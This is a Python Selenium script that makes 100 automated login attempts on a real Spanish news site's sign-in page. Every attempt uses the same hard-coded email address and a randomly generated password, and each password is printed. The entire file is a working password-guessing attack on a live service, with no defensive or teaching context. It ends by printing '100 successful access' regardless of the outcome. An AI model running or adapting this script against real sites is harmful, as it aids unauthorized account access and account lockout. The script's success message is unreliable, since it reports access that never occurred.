import time
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("https://www.larazon.es/acceder/")
time.sleep(5)
letter = string.ascii_letters
numbers = string.digits
simbols = string.punctuation
base = letter + numbers + simbols

username = "tegakoh202@ofenbuy.com"
boton = driver.find_element_by_id("didomi-notice-agree-button")
boton.click()
time.sleep(5)

for i in range(100):
    casillaUser = driver.find_element_by_id("login-email")
    casillaUser.clear()
    casillaUser.send_keys(username)
    casillaPassword = driver.find_element_by_id("login-password")
    casillaPassword.clear()
    password = ''.join(random.choice(base) for j in range(10))
    casillaPassword.send_keys(password)
    print(password)
    boton = driver.find_element_by_id("login-submit")
    boton.click()

print("100 successful access")